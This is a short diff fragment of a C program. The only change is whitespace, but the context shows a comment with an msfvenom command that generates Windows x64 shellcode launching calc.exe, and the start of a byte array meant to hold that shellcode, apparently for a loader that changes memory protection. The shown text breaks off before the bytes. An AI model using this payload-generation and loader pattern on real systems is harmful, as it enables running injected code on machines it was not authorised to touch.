@@ -4,7 +4,7 @@
 
 int main(int argc, char const *argv[])
 {
-    DWORD   oldProtection;
+    DWORD oldProtection;
 // msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
 // --platform windows -a x64 -b "\x00\x0a\x0d" -f c -v exec
     unsigned char exec[] = 
